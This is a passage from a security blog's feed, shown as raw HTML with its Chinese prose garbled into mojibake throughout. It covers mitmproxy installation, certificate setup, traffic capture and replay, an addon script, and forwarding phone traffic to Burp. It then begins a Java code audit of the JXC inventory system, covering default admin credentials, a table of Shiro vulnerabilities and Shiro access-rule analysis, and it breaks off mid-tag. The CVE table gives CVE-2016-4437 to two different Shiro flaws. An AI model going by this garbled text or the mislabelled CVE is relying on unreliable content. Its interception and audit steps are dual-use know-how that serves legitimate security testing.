pipï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œè‡ªè¡Œå®‰è£…ã€‚æœ¬äººç¯å¢ƒä½¿ç”¨çš„æ˜¯ Python 3.9.11ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install mitmproxy</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134605136.png" data-caption="image-20221211134605136"><img src="/../images/tools/mitmproxy/image-20221211134605136.png" alt="image-20221211134605136"></a><br><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134655595.png" data-caption="image-20221211134655595"><img src="/../images/tools/mitmproxy/image-20221211134655595.png" alt="image-20221211134655595"></a></p><p>æŸ¥çœ‹ç‰ˆæœ¬æ˜¯å¦æˆåŠŸå®‰è£…</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump --version</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134826164.png" data-caption="image-20221211134826164"><img src="/../images/tools/mitmproxy/image-20221211134826164.png" alt="image-20221211134826164"></a></p><h2 id="ä¸‰ã€Mitmproxy-ä½¿ç”¨"><a href="#ä¸‰ã€Mitmproxy-ä½¿ç”¨" class="headerlink" title="ä¸‰ã€Mitmproxy ä½¿ç”¨"></a>ä¸‰ã€Mitmproxy ä½¿ç”¨</h2><p>Mitmproxy æœ‰ä¸‰ç§å¯åŠ¨å‘½ä»¤ <code>mitmproxy</code>ã€<code>mitmdump</code>ã€<code>mitmweb</code>,ä»»æ„ä¸€ç§å‘½ä»¤å‡å¯å¯åŠ¨è½¯ä»¶ï¼ŒåŒºåˆ«æ˜¯äº¤äº’ç•Œé¢çš„ä¸åŒã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| å‘½ä»¤      | åŠŸèƒ½                   |</span><br><span class="line">| --------- | ---------------------- |</span><br><span class="line">| mitmproxy | æä¾›å‘½ä»¤è¡Œç•Œé¢         |</span><br><span class="line">| mitmdump  | æä¾›ä¸€ä¸ªç®€å•çš„ç»ˆç«¯è¾“å‡º |</span><br><span class="line">| mitmweb   | æä¾›åœ¨çº¿æµè§ˆå™¨æŠ“åŒ…ç•Œé¢ |</span><br></pre></td></tr></table></figure></div><p>å¼€å§‹ä½¿ç”¨å‰é¦–å…ˆå®‰è£… mitmproxy è¯ä¹¦ï¼Œcmd ç›´æ¥è¾“å…¥ <code>mitmproxy</code> å¯åŠ¨è½¯ä»¶ï¼Œé»˜è®¤ä¼šç›‘å¬ <a href="http://localhost:8080/">http://localhost:8080</a> ,ç„¶åè®¿é—® <a href="http://mitm.it/">http://mitm.it/</a> å®‰è£…è¯ä¹¦ã€‚å‡ºç°ä¸‹å›¾åˆ™ä»£ç†è®¾ç½®æ²¡æœ‰æˆåŠŸã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141155354.png" data-caption="image-20221211141155354"><img src="/../images/tools/mitmproxy/image-20221211141155354.png" alt="image-20221211141155354"></a></p><p>è®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œç‚¹å‡»ä¿å­˜</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141430394.png" data-caption="image-20221211141430394"><img src="/../images/tools/mitmproxy/image-20221211141430394.png" alt="image-20221211141430394"></a></p><p>å†æ¬¡è®¿é—® <a href="http://mitm.it/">http://mitm.it/</a> é€‰æ‹©å¯¹åº”çš„è¯ä¹¦è¿›è¡Œå®‰è£…å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141300248.png" data-caption="image-20221211141300248"><img src="/../images/tools/mitmproxy/image-20221211141300248.png" alt="image-20221211141300248"></a></p><p>å®‰è£…è¯ä¹¦</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141856418.png" data-caption="image-20221211141856418"><img src="/../images/tools/mitmproxy/image-20221211141856418.png" alt="image-20221211141856418"></a></p><p>å¯†ç æ— éœ€å¡«å†™</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141935950.png" data-caption="image-20221211141935950"><img src="/../images/tools/mitmproxy/image-20221211141935950.png" alt="image-20221211141935950"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142028689.png" data-caption="image-20221211142028689"><img src="/../images/tools/mitmproxy/image-20221211142028689.png" alt="image-20221211142028689"></a></p><h3 id="1ã€mitmproxy"><a href="#1ã€mitmproxy" class="headerlink" title="1ã€mitmproxy"></a>1ã€mitmproxy</h3><p>cmd å‘½ä»¤è¡Œè¾“å…¥ <code>mitmproxy</code> å¼€å¯æŠ“åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142249404.png" data-caption="image-20221211142249404"><img src="/../images/tools/mitmproxy/image-20221211142249404.png" alt="image-20221211142249404"></a></p><p>ç‚¹å‡»æ•°æ®åŒ…å¯æŸ¥çœ‹å…·ä½“å“åº”,ç‚¹å‡» <code>q</code> è¿”å›ä¸»é¡µ</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142409754.png" data-caption="image-20221211142409754"><img src="/../images/tools/mitmproxy/image-20221211142409754.png" alt="image-20221211142409754"></a></p><p>ä¹Ÿå¯ä»¥æŒ‡å®šç«¯å£è¿›è¡Œç›‘å¬ï¼š<code>mitmproxy --listen-port 9000</code> ï¼ˆmitmproxy -p 9000 äº¦å¯ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221230171902531.png" data-caption="image-20221230171902531"><img src="/../images/tools/mitmproxy/image-20221230171902531.png" alt="image-20221230171902531"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211143116722.png" data-caption="image-20221211143116722"><img src="/../images/tools/mitmproxy/image-20221211143116722.png" alt="image-20221211143116722"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211143207912.png" data-caption="image-20221211143207912"><img src="/../images/tools/mitmproxy/image-20221211143207912.png" alt="image-20221211143207912"></a></p><h3 id="2ã€mitmdump"><a href="#2ã€mitmdump" class="headerlink" title="2ã€mitmdump"></a>2ã€mitmdump</h3><p>å½•åˆ¶å›æ”¾è¯·æ±‚ï¼Œæ­¤å‘½ä»¤æ— æ³•æŸ¥çœ‹å…·ä½“çš„è¯·æ±‚æ•°æ®ï¼Œåªæ˜¯é»˜é»˜è¿è¡Œåœ¨åå°ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ä½¿ç”¨æ­¤å‘½ä»¤ã€‚</p><p>é€šè¿‡å‘½ä»¤ï¼š<code>mitmdump -w dump.txt</code> å¯å°† 8080 ç«¯å£çš„è¯·æ±‚å½•åˆ¶åœ¨ <code>dump.txt</code> æ–‡ä»¶ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211145658121.png" data-caption="image-20221211145658121"><img src="/../images/tools/mitmproxy/image-20221211145658121.png" alt="image-20221211145658121"></a></p><p>ç„¶åé€šè¿‡å‘½ä»¤: <code>mitmdump -nC dump.txt</code> è¿›è¡Œå›æ”¾è¯·æ±‚</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211145820595.png" data-caption="image-20221211145820595"><img src="/../images/tools/mitmproxy/image-20221211145820595.png" alt="image-20221211145820595"></a></p><h3 id="3ã€mitmweb"><a href="#3ã€mitmweb" class="headerlink" title="3ã€mitmweb"></a>3ã€mitmweb</h3><p>æ­¤å‘½ä»¤èƒ½ä¸ºç”¨æˆ·æä¾› web ç«¯ç•Œé¢ï¼Œç›¸å¯¹æ¯”è¾ƒå‹å¥½ã€‚</p><p>æŒ‡å®š <code>8080</code> ä¸ºç›‘å¬ç«¯å£ï¼Œ<code>Web server listening at http://127.0.0.1:8081/</code>,å¼€å¯å‘½ä»¤åä¼šè‡ªåŠ¨æ‰“å¼€ web ç«¯ </p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150024961.png" data-caption="image-20221211150024961"><img src="/../images/tools/mitmproxy/image-20221211150024961.png" alt="image-20221211150024961"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150131731.png" data-caption="image-20221211150131731"><img src="/../images/tools/mitmproxy/image-20221211150131731.png" alt="image-20221211150131731"></a></p><p>ç•Œé¢ç›¸å¯¹å‹å¥½ï¼Œæ¸…æ™°å¯è§</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150204910.png" data-caption="image-20221211150204910"><img src="/../images/tools/mitmproxy/image-20221211150204910.png" alt="image-20221211150204910"></a></p><h2 id="å››ã€æ‰©å±•"><a href="#å››ã€æ‰©å±•" class="headerlink" title="å››ã€æ‰©å±•"></a>å››ã€æ‰©å±•</h2><h3 id="1ã€è‡ªå®šä¹‰å¼€å‘è„šæœ¬"><a href="#1ã€è‡ªå®šä¹‰å¼€å‘è„šæœ¬" class="headerlink" title="1ã€è‡ªå®šä¹‰å¼€å‘è„šæœ¬"></a>1ã€è‡ªå®šä¹‰å¼€å‘è„šæœ¬</h3><p>è‡ªå®šä¹‰è„šæœ¬å¯ä»¥å®ç°æ‹¦æˆªè¯·æ±‚ï¼Œä»è€Œå¯¹è¯·æ±‚å¤´ã€è¯·æ±‚ã€å“åº”ã€å“åº”å¤´è¿›è¡Œä¿®æ”¹çš„æ•ˆæœã€‚å½“äººæ“ä½œæ—¶ï¼Œå°±èƒ½åœ¨æ‹¦æˆªè¯·æ±‚è¿›è¡Œå¤„ç†çš„æ—¶å€™è¿›è¡Œæ•°æ®å¤„ç†</p><p>ç¼–å†™ä¸€ä¸ª Python æ–‡ä»¶é€šè¿‡ mitmproxy åŠ è½½ï¼Œæ–‡ä»¶å®šä¹‰äº†å˜é‡ addonsï¼Œaddons æ˜¯ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªç±»å®ä¾‹ï¼Œè¿™äº›ç±»æœ‰è‹¥å¹²æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•å®ç°äº†æŸäº› mitmproxy æä¾›çš„äº‹ä»¶ï¼Œmitmproxy ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚è¿™äº›ç±»ï¼Œç§°ä¸ºä¸€ä¸ªä¸ª <code>addon</code>ï¼Œæ¯”å¦‚ä¸€ä¸ªå« Counter çš„ addon(æ’ä»¶)ï¼Œæ›´å¤šè„šæœ¬è¯·æŸ¥çœ‹<a href="https://github.com/mitmproxy/mitmproxy/tree/main/mitmproxy/addons">å®˜æ–¹å†…ç½® addon</a></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mitmproxy.http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line"><span class="comment"># é‡å†™æŒ‡å®šæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        self.num = self.num + <span class="number">1</span></span><br><span class="line">        ctx.log.info(<span class="string">&quot;We&#x27;ve seen %d flows&quot;</span> % self.num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    Counter()</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>å°†è„šæœ¬ä¿å­˜ä¸º addons.py ï¼Œé‡æ–°å¯åŠ¨ mitmproxy: <code>mitmweb -s addons.py</code></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211210114217.png" data-caption="image-20221211210114217"><img src="/../images/tools/mitmproxy/image-20221211210114217.png" alt="image-20221211210114217"></a></p><h3 id="2ã€å…¶ä»–å‘½ä»¤"><a href="#2ã€å…¶ä»–å‘½ä»¤" class="headerlink" title="2ã€å…¶ä»–å‘½ä»¤"></a>2ã€å…¶ä»–å‘½ä»¤</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -w outfile #æˆªè·çš„æ•°æ®ä¿å­˜åˆ°æ–‡ä»¶ä¸­</span><br><span class="line">mitmdump -s script.py #æŒ‡å®šä¸€ä¸ªè„šæœ¬æ¥å¤„ç†æˆªè·çš„æ•°æ®</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€æ›´æ–°"><a href="#äº”ã€æ›´æ–°" class="headerlink" title="äº”ã€æ›´æ–°"></a>äº”ã€æ›´æ–°</h2><h3 id="20241128"><a href="#20241128" class="headerlink" title="20241128"></a>20241128</h3><blockquote><p>è½¬å‘æ‰‹æœºæµé‡è‡³burp</p></blockquote><p>1ã€mitmproxy å¯åŠ¨ç›‘å¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --listen-host 192.168.140.193 -p 9001 --mode upstream:http://127.0.0.1:8080 --ssl-insecure</span><br></pre></td></tr></table></figure></div><p>2ã€æ‰‹æœºè®¾ç½®ä»£ç†åï¼Œè®¿é—® <a href="http://mitm.it/">http://mitm.it</a> å®‰è£…è¯ä¹¦</p><p>3ã€burpæ­£å¸¸å¼€å¯8080ä»£ç†</p><p>![image-20241128142207054](E:\Security file\learning notes\images\image-20241128142207054.png)</p><p>![image-20241128142608418](E:\Security file\learning notes\images\image-20241128142608418.png)</p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/zhangmingyan/p/11358886.html</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzI2NjcxNTg0Nw==&amp;mid=2247483709&amp;idx=1&amp;sn=b2b237d5354a9c691a803a371df51ed0&amp;chksm=ea889695ddff1f832200c9edb5fcc2c5169dc4c11ddf0fe6e210196fc293f58ee974769756fb&amp;scene=126&amp;&amp;sessionid=1670738515#rd</span><br><span class="line">https://docs.mitmproxy.org/stable/mitmproxytutorial-replayrequests/</span><br><span class="line">https://ptorch.com/docs/10/mitmproxytutorial-replayrequests</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·ä½¿ç”¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mitmproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(äº”)-JXCä¼ä¸šçº§è¿›é”€å­˜ç®¡ç†ç³»ç»Ÿ</title>
      <link href="/2022/12/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%94)-JXC%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/12/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%94)-JXC%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>JXC ä¼ä¸šçº§è¿›é”€å­˜ç®¡ç†ç³»ç»Ÿï¼Œé‡‡ç”¨ SpringBoot+Shiro+MyBatis+EasyUIï¼Œé¡¹ç›®é‡‡ç”¨ Maven æ„å»ºï¼Œæ•°æ®åº“æ–‡ä»¶å­˜æ”¾åœ¨ sql&#x2F;jxc.sqlã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/wangjiangfei/JXC">https://github.com/wangjiangfei/JXC</a></p><h2 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h2><p>1ã€åˆ©ç”¨ PHPstudy ä¸­çš„ Mysql ä½œä¸ºæ•°æ®åº“</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126134752778.png" data-caption="image-20221126134752778"><img src="/../images/Java/jxc/image-20221126134752778.png" alt="image-20221126134752778"></a></p><p>è¿™é‡Œä½¿ç”¨ navicat è¿›è¡Œæ•°æ®åº“æ“ä½œï¼Œæ¯”è¾ƒç›´è§‚ä¸€ç‚¹ï¼Œåˆ›å»ºåä¸º jxc çš„æ•°æ®åº“</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126135324816.png" data-caption="image-20221126135324816"><img src="/../images/Java/jxc/image-20221126135324816.png" alt="image-20221126135324816"></a></p><p>å¯¼å…¥æºç ä¸­çš„ &#x2F;sql&#x2F;jxc.sql æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126135554168.png" data-caption="image-20221126135554168"><img src="/../images/Java/jxc/image-20221126135554168.png" alt="image-20221126135554168"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126151230703.png" data-caption="image-20221126151230703"><img src="/../images/Java/jxc/image-20221126151230703.png" alt="image-20221126151230703"></a></p><p>2ã€IDEA å¯¼å…¥æºç ï¼Œæ³¨æ„å¯¼å…¥çš„æ˜¯æºç æ˜¯æ–‡ä»¶å¤¹é‡Œé¢çš„ jxc ç›®å½•ï¼Œå¦åˆ™åŒå±‚ç›®å½•é¡¹ç›®ä¼šè¿è¡Œä¸èµ·æ¥</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126162720625.png" data-caption="image-20221126162720625"><img src="/../images/Java/jxc/image-20221126162720625.png" alt="image-20221126162720625"></a></p><p>å¯¼å…¥é¡¹ç›®å Maven ä¼šè‡ªåŠ¨åŠ è½½ä¾èµ–ï¼Œç„¶åé…ç½®æ•°æ®åº“è´¦å·å¯†ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163003323.png" data-caption="image-20221126163003323"><img src="/../images/Java/jxc/image-20221126163003323.png" alt="image-20221126163003323"></a></p><p>è¿è¡Œå³å¯å¯åŠ¨é¡¹ç›®</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163415477.png" data-caption="image-20221126163415477"><img src="/../images/Java/jxc/image-20221126163415477.png" alt="image-20221126163415477"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163612166.png" data-caption="image-20221126163612166"><img src="/../images/Java/jxc/image-20221126163612166.png" alt="image-20221126163612166"></a></p><p>è®¿é—® 8080 ç«¯å£ç™»å½•åå°ï¼Œè´¦å·å¯†ç ä¸ºï¼šadmin&#x2F;admin123</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163955805.png" data-caption="image-20221126163955805"><img src="/../images/Java/jxc/image-20221126163955805.png" alt="image-20221126163955805"></a></p><h2 id="ä¸‰ã€ä»£ç å®¡è®¡"><a href="#ä¸‰ã€ä»£ç å®¡è®¡" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡"></a>ä¸‰ã€ä»£ç å®¡è®¡</h2><h3 id="1ã€pom-xml-æ¡†æ¶å®¡è®¡"><a href="#1ã€pom-xml-æ¡†æ¶å®¡è®¡" class="headerlink" title="1ã€pom.xml æ¡†æ¶å®¡è®¡"></a>1ã€pom.xml æ¡†æ¶å®¡è®¡</h3><p>é¡¹ç›®ä½¿ç”¨ Maven æ·»åŠ ä¾èµ–ï¼Œå®¡è®¡ pom.xml åˆ†æå…¶é¡¹ç›®æ¡†æ¶ï¼Œå¾—çŸ¥é¡¹ç›®ä½¿ç”¨äº†å¦‚ä¸‹æ¡†æ¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| æ¡†æ¶åç§°     | ç‰ˆæœ¬å·         |</span><br><span class="line">| ----------- | ------------- |</span><br><span class="line">| Spring-Boot | 2.1.0.RELEASE |</span><br><span class="line">| Mybatis     | 1.3.2         |</span><br><span class="line">| Mysql       | 5.1.40        |</span><br><span class="line">| Shiro       | 1.4.0         |</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126203907217.png" data-caption="image-20221126203907217"><img src="/../images/Java/jxc/image-20221126203907217.png" alt="image-20221126203907217"></a></p><p>é¡¹ç›®ä½¿ç”¨äº† Shiro 1.4.0 ç‰ˆæœ¬ï¼Œæˆ‘ä»¬çŸ¥é“ Shiro æ¡†æ¶æ˜¯å­˜åœ¨å¤šä¸ªæ¼æ´çš„ï¼Œæˆ‘ä»¬é€šè¿‡ Google serach å…¶å†å²æ¼æ´ï¼Œé€šè¿‡æŸ¥æ‰¾å¾—çŸ¥éƒ¨åˆ† Shiro å†å²æ¼æ´å¦‚ä¸‹:</p><table><thead><tr><th>ç‰ˆæœ¬</th><th>æ¼æ´</th></tr></thead><tbody><tr><td>Shiro &lt; 1.2.5</td><td>CVE-2016-4437ï¼ˆApache Shiro ååºåˆ—åŒ–æ¼æ´ï¼‰</td></tr><tr><td>Shiro &lt; 1.5.2</td><td>CVE-2020-11989ï¼ˆApache Shiro æƒé™ç»•è¿‡ï¼‰</td></tr><tr><td>Shiro &lt; 1.5.3</td><td>CVE-2020-1957 ï¼ˆApache Shiro æƒé™ç»•è¿‡æ¼æ´ï¼‰</td></tr><tr><td>Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</td><td>CVE-2016-4437ï¼ˆShiro-721 Apache Shiro ååºåˆ—åŒ–æ¼æ´ï¼‰</td></tr></tbody></table><br/><h3 id="2ã€ä»£ç å®¡è®¡"><a href="#2ã€ä»£ç å®¡è®¡" class="headerlink" title="2ã€ä»£ç å®¡è®¡"></a>2ã€ä»£ç å®¡è®¡</h3><p>é€šè¿‡è®¿é—®åå°ï¼Œæˆ‘ä»¬å‘ç°è¿™äº›åŠŸèƒ½ç‚¹ä¸å¹³æ—¶å®æˆ˜é‡åˆ°çš„é¡¹ç›®å¤§åŒå°å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®¡è®¡åŠŸèƒ½ç‚¹ä»£ç è¿›è¡ŒæŒ–æ˜æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126213111483.png" data-caption="image-20221126213111483"><img src="/../images/Java/jxc/image-20221126213111483.png" alt="image-20221126213111483"></a></p><p>å®¡è®¡åˆæœŸï¼Œå…ˆåˆç•¥é€šè¯»ä¸€ä¸‹ä»£ç ï¼Œäº†è§£å…¶ä»£ç ç»“æ„åŠå…¶åŠŸèƒ½ç‚¹ã€‚é€šè¯»è¿‡åï¼Œä¸€èˆ¬æ²¡å¼€å‘ç»éªŒçš„å…¶å®ä¹Ÿæ˜¯ä¸€è„¸æ‡µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘å®šç‚¹å®¡è®¡ï¼Œæ¯”å¦‚å®¡è®¡SQLæ³¨å…¥ï¼Œæˆ‘ä»¬åªéœ€è¦æœç´¢ç‰¹å®šçš„å…³é”®å­—ï¼Œç„¶åå†åˆ†æå…¶ä»£ç æ˜¯å¦å­˜åœ¨æ¼æ´æ¯”è¾ƒå¿«é€Ÿã€‚</p><br/><hr><h4 id="Shiro-æƒé™ç»•è¿‡ï¼ˆä¸å­˜åœ¨ï¼‰"><a href="#Shiro-æƒé™ç»•è¿‡ï¼ˆä¸å­˜åœ¨ï¼‰" class="headerlink" title="Shiro æƒé™ç»•è¿‡ï¼ˆä¸å­˜åœ¨ï¼‰"></a>Shiro æƒé™ç»•è¿‡ï¼ˆä¸å­˜åœ¨ï¼‰</h4><p>æˆ‘ä»¬çŸ¥é“ Shiro æ¡†æ¶æœ¬èº«æ˜¯ç”¨æ¥ä½œèº«ä»½è®¤è¯å’Œæƒé™ç®¡ç†çš„ä¸€æ¬¾æ¡†æ¶ï¼Œå…¶é€šè¿‡æ‹¦æˆªå™¨åŠŸèƒ½æ¥å®ç°å¯¹ç”¨æˆ·è®¿é—®æƒé™çš„æ§åˆ¶å’Œæ‹¦æˆªï¼ŒShiro ä¸­å¸¸è§çš„æ‹¦æˆªå™¨æœ‰ anonã€authc æ‹¦æˆªå™¨ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anon ä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»å½•å°±èƒ½è®¿é—®ï¼Œä¸€èˆ¬ç”¨äºé™æ€èµ„æº,æˆ–è€…ç§»åŠ¨ç«¯æ¥å£ï¼›</span><br><span class="line">authc ä¸ºç™»å½•æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»å½•è®¤è¯æ‰èƒ½è®¿é—®çš„èµ„æºï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶é…ç½®éœ€è¦ç™»å½•çš„ URL è·¯å¾„ï¼›</span><br></pre></td></tr></table></figure></div><p>authc æ‹¦æˆªå™¨åŒ¹é…è§„åˆ™å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| é€šé…ç¬¦ | è¯´æ˜                  |</span><br><span class="line">| ------ | ------------------- |</span><br><span class="line">| ï¼Ÿ     | åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦       |</span><br><span class="line">| *      | åŒ¹é…ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬0ä¸ª   |</span><br><span class="line">| **     | åŒ¹é…ä»»æ„å±‚è·¯å¾„ï¼ŒåŒ…æ‹¬0ä¸ª |</span><br></pre></td></tr></table></figure></div><p>é€šè¿‡åˆ†ææˆ‘ä»¬çŸ¥é“è¯¥ Shiro ç‰ˆæœ¬å¯èƒ½å­˜åœ¨æƒé™ç»•è¿‡æ¼æ´ï¼Œé‚£æˆ‘ä»¬å°±è½¬åˆ° Shiro é…ç½®æ–‡ä»¶å®¡è®¡å…¶ä»£ç ï¼Œæ–‡ä»¶åä¸º <code>ShiroConfig.java</code>ï¼Œé€šè¿‡å®¡è®¡ä»£ç å¯çŸ¥ï¼Œç³»ç»Ÿå¯¹ <code>/static/**</code>,<code>/user/login</code>,<code>/drawImage</code> ä½¿ç”¨äº† anon æ‹¦æˆªå™¨ï¼Œå³å¯¹è¿™å‡ ä¸ªè·¯å¾„ä¸ä¼šè¿›è¡Œæ‹¦æˆªï¼Œæ— éœ€æƒé™å³å¯è®¿é—®ï¼›å¯¹ <code>/**</code> ä½¿ç”¨äº† authc æ‹¦æˆªå™¨ï¼Œå³å¯¹ä»»æ„å±‚è·¯å¾„è¿›è¡Œæ‹¦æˆªï¼Œéœ€è¿›è¡Œæƒé™è®¤è¯ã€‚ç»¼åˆå¾—çŸ¥ï¼Œé™¤äº†<code>/static/**</code>,<code>/user/login</code>,<code>/drawImage</code> è·¯å¾„ä¸éœ€è¦è®¤è¯ï¼Œå…¶ä»–å‡éœ€è¦æƒé™è®¤è¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126211906103.png" data-caption="image-20221126211906103"><img 